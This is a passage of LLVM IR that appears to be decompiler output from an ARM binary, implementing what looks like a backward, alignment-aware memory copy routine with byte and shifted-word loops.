  %v2_2d6c8 = phi i32 [ %v11_2d6b4, %.thread8 ], [ %v0_2d76020, %.thread14 ], [ %v7_2d6b4, %dec_label_pc_2d6a4 ], [ %v2_2d638, %dec_label_pc_2d634 ], [ %v2_2d6d453, %dec_label_pc_2d868 ], [ %v2_2d6d452, %dec_label_pc_2d7fc ], [ %v2_2d6d451, %dec_label_pc_2d790 ], [ %v7_2d6bc, %bb150 ]
  %v0_2d6c4 = phi i32 [ %v0_2d6c4.pre, %.thread8 ], [ %v2_2d708, %.thread14 ], [ %v2_2d6a4, %dec_label_pc_2d6a4 ], [ %v2_2d63c, %dec_label_pc_2d634 ], [ %v0_2d6c449, %dec_label_pc_2d868 ], [ %v0_2d6c448, %dec_label_pc_2d7fc ], [ %v0_2d6c447, %dec_label_pc_2d790 ], [ %v7_2d6c0, %bb150 ]
  %v1_2d6c4 = add i32 %v0_2d6c4, 4
  store i32 %v1_2d6c4, i32* @r2, align 4
  %v3_2d6c4 = sub i32 0, %v0_2d6c4
  %v4_2d6c4 = and i32 %v1_2d6c4, %v3_2d6c4
  %v5_2d6c4 = icmp slt i32 %v4_2d6c4, 0
  store i1 %v5_2d6c4, i1* %cpsr_v.global-to-local, align 1
  %v6_2d6c4 = icmp slt i32 %v1_2d6c4, 0
  store i1 %v6_2d6c4, i1* %cpsr_n.global-to-local, align 1
  %v7_2d6c4 = icmp eq i32 %v1_2d6c4, 0
  store i1 %v7_2d6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2d6c4, label %.thread130, label %bb152

bb152:                                            ; preds = %bb151
  %v1_2d6cc = add i32 %v0_2d6c4, 2
  %v3_2d6cc = sub i32 -3, %v0_2d6c4
  %v4_2d6cc = and i32 %v3_2d6cc, %v1_2d6c4
  %v5_2d6cc = icmp slt i32 %v4_2d6cc, 0
  store i1 %v5_2d6cc, i1* %cpsr_v.global-to-local, align 1
  %v6_2d6cc = icmp slt i32 %v1_2d6cc, 0
  store i1 %v6_2d6cc, i1* %cpsr_n.global-to-local, align 1
  %v7_2d6cc = icmp eq i32 %v1_2d6c4, 2
  store i1 %v7_2d6cc, i1* %cpsr_z.global-to-local, align 1
  %v0_2d6d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d6d0 = add i32 %v0_2d6d0, -1
  %v2_2d6d0 = inttoptr i32 %v1_2d6d0 to i8*
  %v3_2d6d0 = load i8, i8* %v2_2d6d0, align 1
  %v4_2d6d0 = zext i8 %v3_2d6d0 to i32
  store i32 %v4_2d6d0, i32* @r3, align 4
  store i32 %v1_2d6d0, i32* %r1.global-to-local, align 4
  %v3_2d6d4 = add i32 %v2_2d6c8, -1
  %v4_2d6d4 = inttoptr i32 %v3_2d6d4 to i8*
  store i8 %v3_2d6d0, i8* %v4_2d6d4, align 1
  %v5_2d6d4 = load i32, i32* %r0.global-to-local, align 4
  %v6_2d6d4 = add i32 %v5_2d6d4, -1
  store i32 %v6_2d6d4, i32* %r0.global-to-local, align 4
  %v0_2d6d8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2d6d8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2d6d8 = xor i1 %v0_2d6d8, %v1_2d6d8
  br i1 %v2_2d6d8, label %.thread129, label %bb153

bb153:                                            ; preds = %bb152
  %v3_2d6d8 = load i32, i32* %r1.global-to-local, align 4
  %v4_2d6d8 = add i32 %v3_2d6d8, -1
  %v5_2d6d8 = inttoptr i32 %v4_2d6d8 to i8*
  %v6_2d6d8 = load i8, i8* %v5_2d6d8, align 1
  %v7_2d6d8 = zext i8 %v6_2d6d8 to i32
  store i32 %v7_2d6d8, i32* @r3, align 4
  store i32 %v4_2d6d8, i32* %r1.global-to-local, align 4
  %v6_2d6dc = add i32 %v5_2d6d4, -2
  %v7_2d6dc = inttoptr i32 %v6_2d6dc to i8*
  store i8 %v6_2d6d8, i8* %v7_2d6dc, align 1
  %v8_2d6dc = load i32, i32* %r0.global-to-local, align 4
  %v9_2d6dc = add i32 %v8_2d6dc, -1
  store i32 %v9_2d6dc, i32* %r0.global-to-local, align 4
  %v1_2d6e0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2d6e0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb152, %bb153
  %v7_2d6e4 = phi i32 [ %v9_2d6dc, %bb153 ], [ %v6_2d6d4, %bb152 ]
  %v2_2d6e4 = phi i1 [ %v2_2d6e0.pre, %bb153 ], [ %v1_2d6d8, %bb152 ]
  %v1_2d6e4 = phi i1 [ %v1_2d6e0.pre, %bb153 ], [ %v0_2d6d8, %bb152 ]
  %v0_2d6e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2d6e0 = xor i1 %v2_2d6e4, %v1_2d6e4
  %v4_2d6e0 = or i1 %v0_2d6e0, %v3_2d6e0
  br i1 %v4_2d6e0, label %.thread130, label %bb154

bb154:                                            ; preds = %.thread129
  %v5_2d6e0 = load i32, i32* %r1.global-to-local, align 4
  %v6_2d6e0 = add i32 %v5_2d6e0, -1
  %v7_2d6e0 = inttoptr i32 %v6_2d6e0 to i8*
  %v8_2d6e0 = load i8, i8* %v7_2d6e0, align 1
  %v9_2d6e0 = zext i8 %v8_2d6e0 to i32
  store i32 %v9_2d6e0, i32* @r3, align 4
  store i32 %v6_2d6e0, i32* %r1.global-to-local, align 4
  %v8_2d6e4 = add i32 %v7_2d6e4, -1
  %v9_2d6e4 = inttoptr i32 %v8_2d6e4 to i8*
  store i8 %v8_2d6e0, i8* %v9_2d6e4, align 1
  %v10_2d6e4 = load i32, i32* %r0.global-to-local, align 4
  %v11_2d6e4 = add i32 %v10_2d6e4, -1
  store i32 %v11_2d6e4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_2d6ec:                               ; preds = %dec_label_pc_2d644
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_2d6ec = icmp eq i32 %v1_2d644, 1
  store i1 %v8_2d6ec, i1* %cpsr_n.global-to-local, align 1
  %v9_2d6ec = icmp eq i32 %v1_2d644, 2
  store i1 %v9_2d6ec, i1* %cpsr_z.global-to-local, align 1
  %v1_2d6f0 = add i32 %v2_2d634, -1
  %v2_2d6f0 = inttoptr i32 %v1_2d6f0 to i8*
  %v3_2d6f0 = load i8, i8* %v2_2d6f0, align 1
  %v4_2d6f0 = zext i8 %v3_2d6f0 to i32
  store i32 %v4_2d6f0, i32* @r3, align 4
  store i32 %v1_2d6f0, i32* %r1.global-to-local, align 4
  %v3_2d6f4 = add i32 %v2_2d638, -1
  %v4_2d6f4 = inttoptr i32 %v3_2d6f4 to i8*
  store i8 %v3_2d6f0, i8* %v4_2d6f4, align 1
  %v5_2d6f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_2d6f4 = add i32 %v5_2d6f4, -1
  store i32 %v6_2d6f4, i32* %r0.global-to-local, align 4
  br i1 %v8_2d6ec, label %.thread14, label %bb155

bb155:                                            ; preds = %dec_label_pc_2d6ec
  %v6_2d6f8 = load i32, i32* %r1.global-to-local, align 4
  %v7_2d6f8 = add i32 %v6_2d6f8, -1
  %v8_2d6f8 = inttoptr i32 %v7_2d6f8 to i8*
  %v9_2d6f8 = load i8, i8* %v8_2d6f8, align 1
  %v10_2d6f8 = zext i8 %v9_2d6f8 to i32
  store i32 %v10_2d6f8, i32* @r3, align 4
  store i32 %v7_2d6f8, i32* %r1.global-to-local, align 4
  %v9_2d6fc = add i32 %v5_2d6f4, -2
  %v10_2d6fc = inttoptr i32 %v9_2d6fc to i8*
  store i8 %v9_2d6f8, i8* %v10_2d6fc, align 1
  %v11_2d6fc = load i32, i32* %r0.global-to-local, align 4
  %v12_2d6fc = add i32 %v11_2d6fc, -1
  store i32 %v12_2d6fc, i32* %r0.global-to-local, align 4
  br i1 %v9_2d6ec, label %.thread14, label %bb156

bb156:                                            ; preds = %bb155
  %v8_2d700 = load i32, i32* %r1.global-to-local, align 4
  %v9_2d700 = add i32 %v8_2d700, -1
  %v10_2d700 = inttoptr i32 %v9_2d700 to i8*
  %v11_2d700 = load i8, i8* %v10_2d700, align 1
  %v12_2d700 = zext i8 %v11_2d700 to i32
  store i32 %v12_2d700, i32* @r3, align 4
  store i32 %v9_2d700, i32* %r1.global-to-local, align 4
  %v11_2d704 = add i32 %v11_2d6fc, -2
  %v12_2d704 = inttoptr i32 %v11_2d704 to i8*
  store i8 %v11_2d700, i8* %v12_2d704, align 1
  %v13_2d704 = load i32, i32* %r0.global-to-local, align 4
  %v14_2d704 = add i32 %v13_2d704, -1
  store i32 %v14_2d704, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb155, %dec_label_pc_2d6ec, %bb156
  %v0_2d76020 = phi i32 [ %v12_2d6fc, %bb155 ], [ %v6_2d6f4, %dec_label_pc_2d6ec ], [ %v14_2d704, %bb156 ]
  %v0_2d708 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d708 = load i32, i32* @ip, align 4
  %v2_2d708 = sub i32 %v0_2d708, %v1_2d708
  store i32 %v2_2d708, i32* %r2.global-to-local, align 4
  %v4_2d708 = xor i32 %v1_2d708, %v0_2d708
  %v5_2d708 = xor i32 %v2_2d708, %v0_2d708
  %v6_2d708 = and i32 %v5_2d708, %v4_2d708
  %v7_2d708 = icmp slt i32 %v6_2d708, 0
  store i1 %v7_2d708, i1* %cpsr_v.global-to-local, align 1
  %v8_2d708 = icmp slt i32 %v2_2d708, 0
  store i1 %v8_2d708, i1* %cpsr_n.global-to-local, align 1
  %v9_2d708 = icmp eq i32 %v0_2d708, %v1_2d708
  store i1 %v9_2d708, i1* %cpsr_z.global-to-local, align 1
  %v5_2d70c = icmp slt i32 %v0_2d708, %v1_2d708
  br i1 %v5_2d70c, label %bb151, label %dec_label_pc_2d710

dec_label_pc_2d710:                               ; preds = %.thread14
  %v0_2d710 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d710 = urem i32 %v0_2d710, 4
  store i32 %v1_2d710, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2d710 = icmp eq i32 %v1_2d710, 0
  store i1 %v2_2d710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d710, label %dec_label_pc_2d654, label %dec_label_pc_2d718

dec_label_pc_2d718:                               ; preds = %dec_label_pc_2d64c, %dec_label_pc_2d710
  %v0_2d76019 = phi i32 [ %v2_2d638, %dec_label_pc_2d64c ], [ %v0_2d76020, %dec_label_pc_2d710 ]
  %v0_2d80c = phi i32 [ %v2_2d63c, %dec_label_pc_2d64c ], [ %v2_2d708, %dec_label_pc_2d710 ]
  %v0_2d718 = phi i32 [ %v2_2d634, %dec_label_pc_2d64c ], [ %v0_2d710, %dec_label_pc_2d710 ]
  %v0_2d720 = phi i32 [ %v1_2d64c, %dec_label_pc_2d64c ], [ %v1_2d710, %dec_label_pc_2d710 ]
  %v1_2d718 = and i32 %v0_2d718, -4
  store i32 %v1_2d718, i32* %r1.global-to-local, align 4
  %v1_2d71c = inttoptr i32 %v1_2d718 to i32*
  %v2_2d71c = load i32, i32* %v1_2d71c, align 4
  store i32 %v2_2d71c, i32* @r3, align 4
  %v7_2d720 = icmp ult i32 %v0_2d720, 2
  %v2_2d804 = add i32 %v0_2d80c, -12
  %v4_2d804 = sub i32 11, %v0_2d80c
  %v5_2d804 = and i32 %v4_2d804, %v0_2d80c
  %v6_2d804 = icmp slt i32 %v5_2d804, 0
  store i1 %v6_2d804, i1* %cpsr_v.global-to-local, align 1
  %v7_2d804 = icmp slt i32 %v2_2d804, 0
  store i1 %v7_2d804, i1* %cpsr_n.global-to-local, align 1
  %v8_2d804 = icmp eq i32 %v0_2d80c, 12
  store i1 %v8_2d804, i1* %cpsr_z.global-to-local, align 1
  %v5_2d808 = icmp slt i32 %v0_2d80c, 12
  br i1 %v7_2d720, label %dec_label_pc_2d804, label %dec_label_pc_2d728

dec_label_pc_2d728:                               ; preds = %dec_label_pc_2d718
  %v8_2d720 = icmp eq i32 %v0_2d720, 2
  br i1 %v8_2d720, label %dec_label_pc_2d798, label %dec_label_pc_2d72c

dec_label_pc_2d72c:                               ; preds = %dec_label_pc_2d728
  br i1 %v5_2d808, label %dec_label_pc_2d778, label %dec_label_pc_2d734

dec_label_pc_2d734:                               ; preds = %dec_label_pc_2d72c
  store i32 %v2_2d804, i32* %r2.global-to-local, align 4
  %v3_2d738 = load i32, i32* @r4, align 4
  store i32 %v3_2d738, i32* %stack_var_-12, align 4
  %v6_2d738 = load i32, i32* @r5, align 4
  %v8_2d738 = inttoptr i32 %v6_2d738 to i8*
  store i8* %v8_2d738, i8** %stack_var_-8, align 4
  %v11_2d738 = load i32, i32* @lr, align 4
  br label %dec_label_pc_2d73c

dec_label_pc_2d73c:                               ; preds = %dec_label_pc_2d73c.dec_label_pc_2d73c_crit_edge, %dec_label_pc_2d734
  %v0_2d760 = phi i32 [ %v1_2d760, %dec_label_pc_2d73c.dec_label_pc_2d73c_crit_edge ], [ %v0_2d76019, %dec_label_pc_2d734 ]
  %v0_2d740 = phi i32 [ %v0_2d740.pre, %dec_label_pc_2d73c.dec_label_pc_2d73c_crit_edge ], [ %v1_2d718, %dec_label_pc_2d734 ]
  %v0_2d73c = phi i32 [ %v0_2d73c.pre, %dec_label_pc_2d73c.dec_label_pc_2d73c_crit_edge ], [ %v2_2d71c, %dec_label_pc_2d734 ]
  %v3_2d73c = mul i32 %v0_2d73c, 256
  store i32 %v3_2d73c, i32* %lr.global-to-local, align 4
  %v1_2d740 = add i32 %v0_2d740, -4
  %v2_2d740 = inttoptr i32 %v1_2d740 to i32*
  %v3_2d740 = load i32, i32* %v2_2d740, align 4
  store i32 %v3_2d740, i32* @r3, align 4
  %v4_2d740 = add i32 %v0_2d740, -8
  %v5_2d740 = inttoptr i32 %v4_2d740 to i32*
  %v6_2d740 = load i32, i32* %v5_2d740, align 4
  store i32 %v6_2d740, i32* %r4.global-to-local, align 4
  %v7_2d740 = add i32 %v0_2d740, -12
  %v8_2d740 = inttoptr i32 %v7_2d740 to i32*
  %v9_2d740 = load i32, i32* %v8_2d740, align 4
  store i32 %v9_2d740, i32* %r5.global-to-local, align 4
  %v10_2d740 = add i32 %v0_2d740, -16
  %v11_2d740 = inttoptr i32 %v10_2d740 to i32*
  %v12_2d740 = load i32, i32* %v11_2d740, align 4
  store i32 %v10_2d740, i32* %r1.global-to-local, align 4
  %v4_2d744 = udiv i32 %v12_2d740, 16777216
  %v5_2d744 = or i32 %v4_2d744, %v3_2d73c
  store i32 %v5_2d744, i32* %lr.global-to-local, align 4
  %v3_2d748 = mul i32 %v12_2d740, 256
  %v4_2d74c = udiv i32 %v9_2d740, 16777216
  %v5_2d74c = or i32 %v3_2d748, %v4_2d74c
  store i32 %v5_2d74c, i32* @ip, align 4
  %v3_2d750 = mul i32 %v9_2d740, 256
  %v4_2d754 = udiv i32 %v6_2d740, 16777216
  %v5_2d754 = or i32 %v3_2d750, %v4_2d754
  store i32 %v5_2d754, i32* %r5.global-to-local, align 4
  %v3_2d758 = mul i32 %v6_2d740, 256
  %v4_2d75c = udiv i32 %v3_2d740, 16777216
  %v5_2d75c = or i32 %v3_2d758, %v4_2d75c
  store i32 %v5_2d75c, i32* %r4.global-to-local, align 4
  %v1_2d760 = add i32 %v0_2d760, -16
  %v2_2d760 = inttoptr i32 %v1_2d760 to i32*
  store i32 %v5_2d75c, i32* %v2_2d760, align 4
  %v4_2d760 = add i32 %v0_2d760, -12
  %v5_2d760 = inttoptr i32 %v4_2d760 to i32*
  %v6_2d760 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_2d760, i32* %v5_2d760, align 4
  %v7_2d760 = add i32 %v0_2d760, -8
  %v8_2d760 = inttoptr i32 %v7_2d760 to i32*
  %v9_2d760 = load i32, i32* @ip, align 4
  store i32 %v9_2d760, i32* %v8_2d760, align 4
  %v10_2d760 = add i32 %v0_2d760, -4
  %v11_2d760 = inttoptr i32 %v10_2d760 to i32*
  %v12_2d760 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2d760, i32* %v11_2d760, align 4
  store i32 %v1_2d760, i32* %r0.global-to-local, align 4
  %v0_2d764 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d764 = add i32 %v0_2d764, -16
  store i32 %v2_2d764, i32* %r2.global-to-local, align 4
  %v6_2d768 = icmp slt i32 %v0_2d764, 16
  br i1 %v6_2d768, label %dec_label_pc_2d76c, label %dec_label_pc_2d73c.dec_label_pc_2d73c_crit_edge

dec_label_pc_2d73c.dec_label_pc_2d73c_crit_edge:  ; preds = %dec_label_pc_2d73c
  %v0_2d73c.pre = load i32, i32* @r3, align 4
  %v0_2d740.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d73c

dec_label_pc_2d76c:                               ; preds = %dec_label_pc_2d73c
  %v2_2d76c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2d76c, i32* @r4, align 4
  %v5_2d76c = load i8*, i8** %stack_var_-8, align 4
  %v6_2d76c = ptrtoint i8* %v5_2d76c to i32
  store i32 %v6_2d76c, i32* @r5, align 4
  store i32 %v11_2d738, i32* @lr, align 4
  %v2_2d770 = add i32 %v0_2d764, -4
  store i32 %v2_2d770, i32* %r2.global-to-local, align 4
  %v4_2d770 = add i32 %v0_2d764, 2147483632
  %v5_2d770 = and i32 %v2_2d770, %v4_2d770
  %v6_2d770 = icmp slt i32 %v5_2d770, 0
  store i1 %v6_2d770, i1* %cpsr_v.global-to-local, align 1
  %v7_2d770 = icmp slt i32 %v2_2d770, 0
  store i1 %v7_2d770, i1* %cpsr_n.global-to-local, align 1
  %v8_2d770 = icmp eq i32 %v2_2d770, 0
  store i1 %v8_2d770, i1* %cpsr_z.global-to-local, align 1
  %v5_2d774 = icmp slt i32 %v2_2d764, -12
  br i1 %v5_2d774, label %dec_label_pc_2d790, label %dec_label_pc_2d778

dec_label_pc_2d778:                               ; preds = %dec_label_pc_2d76c, %dec_label_pc_2d72c, %dec_label_pc_2d778
  %v1_2d784 = phi i32 [ %v5_2d784, %dec_label_pc_2d778 ], [ %v1_2d760, %dec_label_pc_2d76c ], [ %v0_2d76019, %dec_label_pc_2d72c ]
  %v0_2d778 = load i32, i32* @r3, align 4
  %v3_2d778 = mul i32 %v0_2d778, 256
  store i32 %v3_2d778, i32* %ip.global-to-local, align 4
  %v0_2d77c = load i32, i32* %r1.global-to-local, align 4
  %v1_2d77c = add i32 %v0_2d77c, -4
  %v2_2d77c = inttoptr i32 %v1_2d77c to i32*
  %v3_2d77c = load i32, i32* %v2_2d77c, align 4
  store i32 %v3_2d77c, i32* @r3, align 4
  store i32 %v1_2d77c, i32* %r1.global-to-local, align 4
  %v4_2d780 = udiv i32 %v3_2d77c, 16777216
  %v5_2d780 = or i32 %v4_2d780, %v3_2d778
  store i32 %v5_2d780, i32* @ip, align 4
  %v2_2d784 = add i32 %v1_2d784, -4
  %v3_2d784 = inttoptr i32 %v2_2d784 to i32*
  store i32 %v5_2d780, i32* %v3_2d784, align 4
  %v4_2d784 = load i32, i32* %r0.global-to-local, align 4
  %v5_2d784 = add i32 %v4_2d784, -4
  store i32 %v5_2d784, i32* %r0.global-to-local, align 4
  %v0_2d788 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d788 = add i32 %v0_2d788, -4
  store i32 %v2_2d788, i32* %r2.global-to-local, align 4
  %v6_2d78c = icmp slt i32 %v0_2d788, 4
  br i1 %v6_2d78c, label %dec_label_pc_2d790.loopexit, label %dec_label_pc_2d778

dec_label_pc_2d790.loopexit:                      ; preds = %dec_label_pc_2d778
  %v4_2d788 = sub i32 3, %v0_2d788
  %v5_2d788 = and i32 %v4_2d788, %v0_2d788
  %v6_2d788 = icmp slt i32 %v5_2d788, 0
  %v7_2d788 = icmp slt i32 %v2_2d788, 0
  store i1 %v6_2d788, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_2d788, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d790

dec_label_pc_2d790:                               ; preds = %dec_label_pc_2d790.loopexit, %dec_label_pc_2d76c
  %v2_2d6d451 = phi i32 [ %v5_2d784, %dec_label_pc_2d790.loopexit ], [ %v1_2d760, %dec_label_pc_2d76c ]
  %v0_2d6c447 = phi i32 [ %v2_2d788, %dec_label_pc_2d790.loopexit ], [ %v2_2d770, %dec_label_pc_2d76c ]
  %v0_2d790 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d790 = add i32 %v0_2d790, 3
  store i32 %v1_2d790, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_2d798:                               ; preds = %dec_label_pc_2d728
  br i1 %v5_2d808, label %dec_label_pc_2d7e4, label %dec_label_pc_2d7a0

dec_label_pc_2d7a0:                               ; preds = %dec_label_pc_2d798
  store i32 %v2_2d804, i32* %r2.global-to-local, align 4
  %v3_2d7a4 = load i32, i32* @r4, align 4
  store i32 %v3_2d7a4, i32* %stack_var_-12, align 4
  %v6_2d7a4 = load i32, i32* @r5, align 4
  %v8_2d7a4 = inttoptr i32 %v6_2d7a4 to i8*
  store i8* %v8_2d7a4, i8** %stack_var_-8, align 4
  %v11_2d7a4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_2d7a8

dec_label_pc_2d7a8:                               ; preds = %dec_label_pc_2d7a8.dec_label_pc_2d7a8_crit_edge, %dec_label_pc_2d7a0
  %v0_2d7cc = phi i32 [ %v1_2d7cc, %dec_label_pc_2d7a8.dec_label_pc_2d7a8_crit_edge ], [ %v0_2d76019, %dec_label_pc_2d7a0 ]
  %v0_2d7ac = phi i32 [ %v0_2d7ac.pre, %dec_label_pc_2d7a8.dec_label_pc_2d7a8_crit_edge ], [ %v1_2d718, %dec_label_pc_2d7a0 ]
  %v0_2d7a8 = phi i32 [ %v0_2d7a8.pre, %dec_label_pc_2d7a8.dec_label_pc_2d7a8_crit_edge ], [ %v2_2d71c, %dec_label_pc_2d7a0 ]
  %v3_2d7a8 = mul i32 %v0_2d7a8, 65536
  store i32 %v3_2d7a8, i32* %lr.global-to-local, align 4
  %v1_2d7ac = add i32 %v0_2d7ac, -4
  %v2_2d7ac = inttoptr i32 %v1_2d7ac to i32*
  %v3_2d7ac = load i32, i32* %v2_2d7ac, align 4
  store i32 %v3_2d7ac, i32* @r3, align 4
  %v4_2d7ac = add i32 %v0_2d7ac, -8
  %v5_2d7ac = inttoptr i32 %v4_2d7ac to i32*
  %v6_2d7ac = load i32, i32* %v5_2d7ac, align 4
  store i32 %v6_2d7ac, i32* %r4.global-to-local, align 4
  %v7_2d7ac = add i32 %v0_2d7ac, -12
  %v8_2d7ac = inttoptr i32 %v7_2d7ac to i32*
  %v9_2d7ac = load i32, i32* %v8_2d7ac, align 4
  store i32 %v9_2d7ac, i32* %r5.global-to-local, align 4
  %v10_2d7ac = add i32 %v0_2d7ac, -16
  %v11_2d7ac = inttoptr i32 %v10_2d7ac to i32*
  %v12_2d7ac = load i32, i32* %v11_2d7ac, align 4
  store i32 %v10_2d7ac, i32* %r1.global-to-local, align 4
  %v4_2d7b0 = udiv i32 %v12_2d7ac, 65536
  %v5_2d7b0 = or i32 %v4_2d7b0, %v3_2d7a8
  store i32 %v5_2d7b0, i32* %lr.global-to-local, align 4
  %v3_2d7b4 = mul i32 %v12_2d7ac, 65536
  %v4_2d7b8 = udiv i32 %v9_2d7ac, 65536
  %v5_2d7b8 = or i32 %v3_2d7b4, %v4_2d7b8
  store i32 %v5_2d7b8, i32* @ip, align 4
  %v3_2d7bc = mul i32 %v9_2d7ac, 65536
  %v4_2d7c0 = udiv i32 %v6_2d7ac, 65536
  %v5_2d7c0 = or i32 %v3_2d7bc, %v4_2d7c0
  store i32 %v5_2d7c0, i32* %r5.global-to-local, align 4
  %v3_2d7c4 = mul i32 %v6_2d7ac, 65536
  %v4_2d7c8 = udiv i32 %v3_2d7ac, 65536
  %v5_2d7c8 = or i32 %v3_2d7c4, %v4_2d7c8
  store i32 %v5_2d7c8, i32* %r4.global-to-local, align 4
  %v1_2d7cc = add i32 %v0_2d7cc, -16
  %v2_2d7cc = inttoptr i32 %v1_2d7cc to i32*
  store i32 %v5_2d7c8, i32* %v2_2d7cc, align 4
  %v4_2d7cc = add i32 %v0_2d7cc, -12
  %v5_2d7cc = inttoptr i32 %v4_2d7cc to i32*
  %v6_2d7cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_2d7cc, i32* %v5_2d7cc, align 4
  %v7_2d7cc = add i32 %v0_2d7cc, -8
  %v8_2d7cc = inttoptr i32 %v7_2d7cc to i32*
  %v9_2d7cc = load i32, i32* @ip, align 4
  store i32 %v9_2d7cc, i32* %v8_2d7cc, align 4
  %v10_2d7cc = add i32 %v0_2d7cc, -4
  %v11_2d7cc = inttoptr i32 %v10_2d7cc to i32*
  %v12_2d7cc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2d7cc, i32* %v11_2d7cc, align 4
  store i32 %v1_2d7cc, i32* %r0.global-to-local, align 4
  %v0_2d7d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d7d0 = add i32 %v0_2d7d0, -16
  store i32 %v2_2d7d0, i32* %r2.global-to-local, align 4
  %v6_2d7d4 = icmp slt i32 %v0_2d7d0, 16
  br i1 %v6_2d7d4, label %dec_label_pc_2d7d8, label %dec_label_pc_2d7a8.dec_label_pc_2d7a8_crit_edge

dec_label_pc_2d7a8.dec_label_pc_2d7a8_crit_edge:  ; preds = %dec_label_pc_2d7a8
  %v0_2d7a8.pre = load i32, i32* @r3, align 4
  %v0_2d7ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d7a8

dec_label_pc_2d7d8:                               ; preds = %dec_label_pc_2d7a8
  %v2_2d7d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2d7d8, i32* @r4, align 4
  %v5_2d7d8 = load i8*, i8** %stack_var_-8, align 4
  %v6_2d7d8 = ptrtoint i8* %v5_2d7d8 to i32
  store i32 %v6_2d7d8, i32* @r5, align 4
  store i32 %v11_2d7a4, i32* @lr, align 4
  %v2_2d7dc = add i32 %v0_2d7d0, -4
  store i32 %v2_2d7dc, i32* %r2.global-to-local, align 4
  %v4_2d7dc = add i32 %v0_2d7d0, 2147483632
  %v5_2d7dc = and i32 %v2_2d7dc, %v4_2d7dc
  %v6_2d7dc = icmp slt i32 %v5_2d7dc, 0
  store i1 %v6_2d7dc, i1* %cpsr_v.global-to-local, align 1
  %v7_2d7dc = icmp slt i32 %v2_2d7dc, 0
  store i1 %v7_2d7dc, i1* %cpsr_n.global-to-local, align 1
  %v8_2d7dc = icmp eq i32 %v2_2d7dc, 0
  store i1 %v8_2d7dc, i1* %cpsr_z.global-to-local, align 1
  %v5_2d7e0 = icmp slt i32 %v2_2d7d0, -12
  br i1 %v5_2d7e0, label %dec_label_pc_2d7fc, label %dec_label_pc_2d7e4

dec_label_pc_2d7e4:                               ; preds = %dec_label_pc_2d7d8, %dec_label_pc_2d798, %dec_label_pc_2d7e4
  %v1_2d7f0 = phi i32 [ %v5_2d7f0, %dec_label_pc_2d7e4 ], [ %v1_2d7cc, %dec_label_pc_2d7d8 ], [ %v0_2d76019, %dec_label_pc_2d798 ]
  %v0_2d7e4 = load i32, i32* @r3, align 4
  %v3_2d7e4 = mul i32 %v0_2d7e4, 65536
  store i32 %v3_2d7e4, i32* %ip.global-to-local, align 4
  %v0_2d7e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d7e8 = add i32 %v0_2d7e8, -4
  %v2_2d7e8 = inttoptr i32 %v1_2d7e8 to i32*
  %v3_2d7e8 = load i32, i32* %v2_2d7e8, align 4
  store i32 %v3_2d7e8, i32* @r3, align 4
  store i32 %v1_2d7e8, i32* %r1.global-to-local, align 4
  %v4_2d7ec = udiv i32 %v3_2d7e8, 65536
  %v5_2d7ec = or i32 %v4_2d7ec, %v3_2d7e4
  store i32 %v5_2d7ec, i32* @ip, align 4
  %v2_2d7f0 = add i32 %v1_2d7f0, -4
  %v3_2d7f0 = inttoptr i32 %v2_2d7f0 to i32*
  store i32 %v5_2d7ec, i32* %v3_2d7f0, align 4
  %v4_2d7f0 = load i32, i32* %r0.global-to-local, align 4
  %v5_2d7f0 = add i32 %v4_2d7f0, -4
  store i32 %v5_2d7f0, i32* %r0.global-to-local, align 4
  %v0_2d7f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d7f4 = add i32 %v0_2d7f4, -4
  store i32 %v2_2d7f4, i32* %r2.global-to-local, align 4
  %v6_2d7f8 = icmp slt i32 %v0_2d7f4, 4
  br i1 %v6_2d7f8, label %dec_label_pc_2d7fc.loopexit, label %dec_label_pc_2d7e4

dec_label_pc_2d7fc.loopexit:                      ; preds = %dec_label_pc_2d7e4
  %v4_2d7f4 = sub i32 3, %v0_2d7f4
  %v5_2d7f4 = and i32 %v4_2d7f4, %v0_2d7f4
  %v6_2d7f4 = icmp slt i32 %v5_2d7f4, 0
  %v7_2d7f4 = icmp slt i32 %v2_2d7f4, 0
  store i1 %v6_2d7f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_2d7f4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d7fc

dec_label_pc_2d7fc:                               ; preds = %dec_label_pc_2d7fc.loopexit, %dec_label_pc_2d7d8
  %v2_2d6d452 = phi i32 [ %v5_2d7f0, %dec_label_pc_2d7fc.loopexit ], [ %v1_2d7cc, %dec_label_pc_2d7d8 ]
